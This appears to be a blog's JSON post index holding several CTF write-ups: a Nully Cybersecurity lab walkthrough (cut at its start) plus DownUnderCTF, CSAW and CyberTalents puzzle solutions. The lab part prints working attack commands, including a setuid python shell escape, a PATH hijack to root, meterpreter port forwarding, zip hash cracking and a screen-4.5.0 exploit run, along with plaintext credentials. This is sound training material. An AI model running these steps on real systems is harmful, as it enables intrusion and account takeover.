5457568 Aug 26 14:19 /usr/bin/python3 -rwsr-xr-- 1 root messagebus 51344 Dec 7 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 473576 Feb 26 2020 /usr/lib/openssh/ssh-keysign /usr/bin/python3 has some opportunity for horizontal privilege escalation. GTFobins comes in handy.\n$ python3 -c \u0026#39;import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; id uid=33(www-data) gid=33(www-data) euid=1000(oscar) groups=33(www-data) We can now access files whose permissions are set to Oscar only.\ncd oscar ls my_password scripts cat my_password H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o` Path variable manipulation # A script called current-date displays the current date. Since in linux, date command is used to do that, I figured the script calls the date command and probably does this using its full path. We can edit our own date variable and pass in /bin/bash so it gets executed when we call the current-date script and drop into a root shell\ncd /tmp ls echo \u0026#34;/bin/bash\u0026#34; \u0026gt; date chmod 777 date export PATH=/tmp:$PATH cd /home/oscar ls -al cd scripts ls current-date ./current-date id uid=0(root) gid=0(root) groups=0(root),33(www-data) cat 2_flag.txt __ __ _ _ _ \\ \\ / / | | | | | \\ \\ /\\ / /__| | | __| | ___ _ __ ___ \\ \\/ \\/ / _ \\ | | / _` |/ _ \\| \u0026#39;_ \\ / _ \\ \\ /\\ / __/ | | | (_| | (_) | | | | __/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___| Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da Now go to the Database server. We get the 2nd flag!\nFlag 3 # Inside the web server, we ftp to the database server and do some digging.\nroot@WebServer:/root# ftp 172.17.0.5 ftp 172.17.0.5 Connected to 172.17.0.5. 220 (vsFTPd 3.0.3) Name (172.17.0.5:root): anonymous anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Aug 27 09:35 pub 226 Directory send OK. ftp\u0026gt; cd pub cd pub 250 Directory successfully changed. ftp\u0026gt; ls ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 0 Aug 27 09:35 test 226 Directory send OK. ftp\u0026gt; ls -al ls -al 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 ftp ftp 4096 Aug 27 09:35 . drwxr-xr-x 3 ftp ftp 4096 Aug 27 08:34 .. drwxr-xr-x 2 ftp ftp 4096 Aug 27 14:44 .folder -rw-r--r-- 1 ftp ftp 0 Aug 27 09:35 test 226 Directory send OK. ftp\u0026gt; mv .folder folder mv .folder folder ?Invalid command ftp\u0026gt; cd .folder cd .folder 250 Directory successfully changed. ftp\u0026gt; ls ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 15 Aug 27 09:07 file.txt 226 Directory send OK. ftp\u0026gt; cat file.txt ftp\u0026gt; ls -al ls -al 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Aug 27 14:44 . drwxr-xr-x 3 ftp ftp 4096 Aug 27 09:35 .. -rw-r--r-- 1 ftp ftp 224 Aug 27 09:37 .backup.zip -rw-r--r-- 1 ftp ftp 15 Aug 27 09:07 file.txt 226 Directory send OK. ftp\u0026gt; get file.txt get file.txt local: file.txt remote: file.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for file.txt (15 bytes). 226 Transfer complete. 15 bytes received in 0.00 secs (92.1285 kB/s) ftp\u0026gt; get .backup.zip get .backup.zip local: .backup.zip remote: .backup.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .backup.zip (224 bytes). 226 Transfer complete. 224 bytes received in 0.00 secs (268.7346 kB/s) ftp\u0026gt; exit exit 221 Goodbye. root@WebServer:/root# ls ls 2_flag.txt file.txt typescript root@WebServer:/root# ls -al ls -al total 60 drwx------ 1 root root 4096 Sep 26 23:01 . drwxr-xr-x 1 root root 4096 Aug 25 16:08 .. -rw-r--r-- 1 root root 224 Sep 26 23:01 .backup.zip -rw------- 1 root root 0 Sep 26 22:02 .bash_history -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw-r--r-- 1 root root 0 Aug 26 14:20 .selected_editor -rwxr-xr-x 1 root root 215 Aug 27 14:43 .services drwx------ 2 root root 4096 Aug 27 09:59 .ssh -rw------- 1 root root 10606 Aug 27 15:05 .viminfo -rw-r--r-- 1 root root 467 Aug 26 14:03 2_flag.txt -rw-r--r-- 1 root root 15 Sep 26 23:00 file.txt -rw-r--r-- 1 root root 10157 Sep 26 13:58 typescript root@WebServer:/root# cat file.txt We retrieve 2 files, file.txt and .backup.zip. file.txt is a dead end so we look into backup.txt.\nI transferred the backup.zip file to oscar’s directory and used chown to give him permissions to access the file. Then pivoted the traffic on port 22 to our localhost so we can access the ssh server as oscar using his credentials(that we found earlier).\nmeterpreter \u0026gt; portfwd add -l 2022 -p 22 -r 172.17.0.4 ssh oscar@localhost -p 2022 oscar@WebServer:~$ ls -al total 40 drwx------ 4 oscar oscar 4096 Sep 26 23:05 . drwxr-xr-x 1 root root 4096 Aug 26 13:38 .. -rw------- 1 oscar oscar 0 Sep 26 22:02 .bash_history -rw-r--r-- 1 oscar oscar 220 Aug 25 16:11 .bash_logout -rw-r--r-- 1 oscar oscar 3771 Aug 25 16:11 .bashrc drwx------ 2 oscar oscar 4096 Aug 25 20:09 .cache -rw-r--r-- 1 oscar oscar 807 Aug 25 16:11 .profile -rw------- 1 oscar oscar 2183 Aug 26 14:25 .viminfo -rw-r--r-- 1 oscar oscar 224 Sep 26 23:01 backup.zip -r-------- 1 oscar oscar 37 Aug 26 14:25 my_password drwx------ 2 oscar oscar 4096 Sep 26 22:57 scripts oscar@WebServer:~$ Now that we can access oscar’s account on our local machine, we can use scp to download the zip file and analyse it incase it requires cracking.\nscp -P 2022 oscar@localhost:/home/oscar/backup.zip Crack the zip file using zip2john and john\nzip2john backup.zip \u0026gt; hash.txt john hash.txt We get a file called creds.txt which contain credentials\ndonald:HBRLoCZ0b9NEgh8vsECS These belong to the database server\nForward the traffic on port 22 of the database server to our local machine\nportfwd add -l 3022 -p 22 -r 172.17.0.5 ssh as donald using the credentials obtained.\nssh donald@localhost -p 3022 The authenticity of host \u0026#39;[localhost]:3022 ([127.0.0.1]:3022)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:qA12BwczynXyAVDqWazjlkn7mBhxZq3VkJ3Dp0fWy2s. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;[localhost]:3022\u0026#39; (ECDSA) to the list of known hosts. donald@localhost\u0026#39;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.15.0-112-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. Last login: Thu Aug 27 15:13:37 2020 from 172.17.0.1 donald@DatabaseServer:~$ Privilege escalation # find / -perm -4000 -exec ls -l {} \\; 2\u0026gt;/dev/null -rwsr-xr-x 1 root root 44784 May 28 08:37 /usr/bin/newgrp -rwsr-xr-x 1 root root 68208 May 28 08:37 /usr/bin/passwd -rwsr-xr-x 1 root root 67816 Apr 2 17:29 /usr/bin/su -rwsr-xr-x 1 root root 55528 Apr 2 17:29 /usr/bin/mount -rwsr-xr-x 1 root root 85064 May 28 08:37 /usr/bin/chfn -rwsr-xr-x 1 root root 39144 Apr 2 17:29 /usr/bin/umount -rwsr-xr-x 1 root root 53040 May 28 08:37 /usr/bin/chsh -rwsr-xr-x 1 root root 88464 May 28 08:37 /usr/bin/gpasswd -rwsr-xr-x 1 root root 1860280 Aug 27 09:50 /usr/bin/screen-4.5.0 -rwsr-xr-- 1 root messagebus 51344 Jun 11 20:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 473576 May 29 09:37 /usr/lib/openssh/ssh-keysign donald@DatabaseServer:~$ This binary stands out\n/usr/bin/screen-4.5.0 Doing a little googling leads as to a script from exploit db, save the script on the system mark it as executable using chmod and execute it\ndonald@DatabaseServer:~$ chmod +x privesc.sh donald@DatabaseServer:~$ ./privesc.sh We get root access and cat the flag in the root directory\n# id uid=0(root) gid=0(root) groups=0(root),1000(donald) # cd /root # ls 3_flag.txt # cat 3_flag.txt _ _ _____ _ _ _ _| || |_| __ \\ | | | | | |_ __ _| |__) |___ ___ | |_ ___ __| | | _| || |_| _ // _ \\ / _ \\| __/ _ \\/ _` | | |_ __ _| | \\ \\ (_) | (_) | || __/ (_| |_| z |_||_| |_| \\_\\___/ \\___/ \\__\\___|\\__,_(_) 6cb25d4789cdd7fa1624e6356e0d825b Congratulations on getting the final flag! You completed the Nully Cybersecurity CTF. I will be glad if you leave a feedback. Twitter https://twitter.com/laf3r_ Discord laf3r#4754 Happy hacking :)\n","date":"26 September 2020","permalink":"/posts/2020-09-26_nully-cybersecurity1vulnuhb/","section":"Posts","summary":"Description # Nully Cybersecurity: 1","title":"NULLY CYBERSECURITY:1(Vulnuhb)"},{"content":"Misc challenges are usually random and require logic and lots of patience to solve. Surprisingly this one wasn’t too challenging.\nThe challenge description is as follows\nWe are given a really noisy wav audio file, I had no clue of solving this at first when my regular audio steganography tools failed. But my teammate came into play with a really good suggestion. QSSTV!\nhttps://storage.googleapis.com/files.duc.tf/uploads/Clive.wav\nQSSTV is a utility for dealing with slow scan television signals. From the challenge description, we can pick out a hint “When I eat too many Tim Tams, I get rather slow!”.\nI used the following commands to setup qsstv on linux sudo apt-get install pavucontrol sudo apt-get install qsstv\nWe need the pavucontrol utility to be able to open audio files.\nType qsstv on the terminal to open the program and select the audio file you’re going to work with\nqsstv maps the wav audio into an image and we can see at the top left what appears to be an encoded flag.\nQHGPS{UHZOYR_Z3Z3_1BEQ}\nThis is ROT13, we decode the flag to: DUTCF{HUMBLE_M3M3_1ORD}\nHappy hacking :)\n","date":"20 September 2020","permalink":"/posts/2020-09-20_downunderctftim-tamsmisc/","section":"Posts","summary":"Misc challenges are usually random and require logic and lots of patience to solve.","title":"DownUnderCTF-Tim Tams(Misc)"},{"content":"Recently, I’ve been getting hooked with forensics challenges, this being the second solve I made for the team.\nThe challenge description is as follows\n“ My friend has been sending me lots of WAV files, I think he is trying to communicate with me, what is the message he sent?”\nThe challenge description was already a hint and I pinpointed this to spectrum steganography. Audacity is a popular tool used to analyze waveforms and spectograms\nthe audio file\nhttps://play.duc.tf/files/cd754e8ca5f4e863149943710549555f/message_1.wav?token=eyJ1c2VyX2lkIjo3NzQsInRlYW1faWQiOjE0NiwiZmlsZV9pZCI6ODV9.X2eJ4g.K-7io8oej81HFrnGLYwMaIrGNMs\naudacity link to download\nhttps://www.audacityteam.org/download/\nProceeding to open the .wav file with audacity and viewing it as a spectorgram, we get the flag!\nDUCTF{m4by3_n0t_s0_h1dd3n}\nHappy hacking :)\n","date":"20 September 2020","permalink":"/posts/2020-09-20_downunderctfon-the-spectrumforensics/","section":"Posts","summary":"Recently, I’ve been getting hooked with forensics challenges, this being the second solve I made for the team.","title":"DownUnderCTF-On the Spectrum(Forensics)"},{"content":"The second challenge in the web category.\nFrom the description and 2 hints, this was what I was able to deduce after several minutes:\nChallenge description: # One of your coworkers in the cloud security department sent you an urgent email, probably about some privacy concerns for your company.\nHint 1:\nPresigning is always better than postsigning\nHint 2:\nIsn’t one of the pieces you find a folder? Look for flag.txt!\nletter:\nFrom hint 1 , lots of googling reveals the challenge is related to aws. Since I hadn’t worked with any aws CTFs before, I decided to delve into some related writeups and reading aws documentations to get some context on what this challenge was about\nThis particular writeup came in handy !\nAWS S3 CTF Challenges\nOkay, so we’ve gathered enough information on how to start the challenge…\nStep 1: Authenticating as a valid user # From the letter , ‘ Make sure you’re a valid user!’ is a hint that you need to successfully authenticate as a valid aws user to access the S3 bucket which is ad586b62e3b5921bd86fe2efa4919208\nStep 2: Accessing the S3 bucket # The aws documentation came in handy! I believe in reading documentation as it saves you alot from unintended errors.\nls - AWS CLI 1.18.137 Command Reference\nFrom the documentation, you get a command to list the contents of the bucket\nInteresting , so the bucket contains several folders\nStep 3: Analysing the bucket contents # I had to find a way to easily work with the contents of the bucket. The best way was to recursively download the bucket contents to my local directory\nThe cp command comes in handy and we get access to all folders in the bucket in our current local directory.\nNow my guess work starts here :D\nI have no way of automating this process since I don’t know what to do, so I manually start to view the folders looking for anything juicy. The second folder reveals something interesting.\nI tried to access the bucket using the aws ls command but that was a dead end. The hunt goes on !\nI continued probing the folders and something interesting pops up. An unusually long string.\nHmmm… this was my lightbulb moment, everything starts to add up as I reread the hints and the presigning information comes in handy.\nPre-signed URLs have five pieces of information; bucket, object, access key, signature, and expiration. awscli tends to present them in this form: https://\u0026lt;bucket\u0026gt;.s3.amazonaws.com/\u0026lt;object\u0026gt;?AWSAccessKeyId=\u0026lt;key\u0026gt;\u0026amp;amp;Expires=\u0026lt;expiration\u0026gt;\u0026amp;amp;Signature=\u0026lt;signature\u0026gt;\nSince the first two pieces of strings stands out from the rest of the other texts in terms of length, I decided to try and grab pieces of text less than/ greater than 30 characters.\nStep 4: Solving the challenge # From the above info, we retrieve the following pieces of text\nSince we now know what presigning urls is, let’s piece the info we have and get the flag.\nFrom the letter, we can get the expiry date and the state in which the letter and convert it into unix time.\nFrom aws presigning protocol documentation\nAuthenticating Requests: Using Query Parameters (AWS Signature Version 4)\nwe can derive the following:\npath to flag=https://super-top-secret-dont-look.s3.us-east-2.amazonaws.com/.sorry/.for/.nothing/flag.txt\nidentity=AKIAQHTF3NZUTQBCUQCK\nSignature=3560cef4b02815e7c5f95f1351c1146c8eeeb7ae0aff0adc5c106f6488db5b6b\nX-Amz-Algorithm=AWS4-HMAC-SHA256\nX-Amz-Date=20200909T195323Z (Unix date format of the date given in the letter)\nX-Amz-Credential=AKIAQHTF3NZUTQBCUQCK/20200909/us-east-2/s3/aws4_request (intenity+date+region)\nX-Amz-SignedHeaders=host\nX-Amz-Expires=604800 (One week in unix time(s))\nFinal url\nhttps://super-top-secret-dont-look.s3.us-east-2.amazonaws.com/.sorry/.for/.nothing/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=AKIAQHTF3NZUTQBCUQCK/20200909/us-east-2/s3/aws4_request\u0026amp;X-Amz-Date=20200909T195323Z\u0026amp;X-Amz-Expires=604800\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Signature=3560cef4b02815e7c5f95f1351c1146c8eeeb7ae0aff0adc5c106f6488db5b6b.\nCurling the request to get the flag\n","date":"14 September 2020","permalink":"/posts/2020-09-14_whistleblowcsaw-ctf-quals-2020/","section":"Posts","summary":"The second challenge in the web category.","title":"whistleblow-CSAW CTF Quals 2020"},{"content":"Diving right into the first web category challenge — widthless.\nThe initial instructions didn’t seem to give us much of a hint :\nWelcome to web! Let’s start off with something kinda funky :)\nhttp://web.chal.csaw.io:5018\nI interacted with the website for a few minutes by trying to figure out what the challenge could be about.\nTried inputting into the form and it says it couldn’t add me to the newsletter…\nAfter viewing the source, we get the first clue of the challenge\nZWSP is fun\nStep 1: Some Reconnaisance # I wanted to gather enough data to figure out what zwsp was all about since I had no clue at first. Googling zwsp, I found out that zwsp (zero width spacing) is a character used in unicode for invisible word separation. More googling reveals that zwsp can be used to hide pieces of information in plain-sight!.\nStep 2: Detecting ZWSP # Stumbled upon a tool called diffchecker that could highlight all the characters that are hidden in a piece of text.\nPasting the entire html source code, you can see presence of hidden text inside the document. So how do I uncover it??\nStep 3: Decoding ZWSP # Since I know the characters do exist, I tried finding scripts that could help in revealing the hidden characters and voila, I came across a steganography library written in javascript from github\nInclude the script using the require function and proceed to decode the section containing the zwsp hidden string. It yields a base64 encoded string YWxtMHN0XzJfM3o=\nDecoding this gives alm0st_2_3z as the output. Flag maybe?? No, challenge still goes on !\nPasting in the decoded string gives this long string.\n/ahsdiufghawuflkaekdhjfaldshjfvbalerhjwfvblasdnjfbldf/\nI spent quite some time trying to figure out what it meant, at first, I thought it was the password to a hidden input field, and tried posting the data to the website but it failed.\nFinally, I figured that the string enclosed in backslashes is actually a directory and the pwd is where the decoded string goes.\nPutting that info in the URL takes us to another page. More ZWSP maybe?\nStep 4: Solving the challenge :D # Viewing the source and repeating the process, but this time actually decoding the whole html source since the zwsp characters were hidden everywhere\nThe following string is yielded from decoding the zwsp — 755f756e6831645f6d33\nDecoding from hex to ascii gives —\nu_unh1d_m3\nThis time we get another directory with a similar pattern to the last but appending the first and second decoded strings\nWe get the flag :) !!!\nHappy hacking :D\n","date":"13 September 2020","permalink":"/posts/2020-09-13_widthless-writeup-csaw-ctf-quals-2020/","section":"Posts","summary":"Diving right into the first web category challenge — widthless.","title":"widthless writeup -CSAW CTF Quals 2020"},{"content":"CyberTalents organized a national CTF competition yesterday which my team and I participated and settled for 2nd place. This is a write-up of the Habibamod challenge (Forensics category).\nPART ONE: PCAP ANALYSIS # We are given a .pcap file (packet capture file) that contains information about communication between 2 people.\nProceed to open the file using wireshark as shown below\nScrolling through the different streams, you notice pieces of text captured during the communication. I then followed the TCP stream to get the full capture. Right click on the packet highlighted, click on follow, then TCP stream\nVoila! you get a dump of the communication data captured.\nThe captured data consists of 2 parts. A string called data, and a base64 encoded string called encoder.\nPART TWO: Python Scripting # I proceeded to decode the base64 data to ascii, giving us a function written in python to convert text to binary, then binary to a combination of dots(0) and exclamation marks (1)\nI wrote a really simple python script to reverse the process, but encountered issues using the binascii library since the binary string was too long. So I manually decoded the binary string.\nDecoding the binary string gives us the flag : )\nHappy hacking :D\n","date":"23 August 2020","permalink":"/posts/2020-08-23_habibamod-ctf-writeupcybertalents-ctf-2020/","section":"Posts","summary":"CyberTalents organized a national CTF competition yesterday which my team and I participated and settled for 2nd place.","title":"Habibamod CTF writeup — CyberTalents CTF 2020"},{"content":"","date":"1 January 0001","permalink":"/posts/2023-04-4_fermat_little/","section":"Posts","summary":"","title":""}]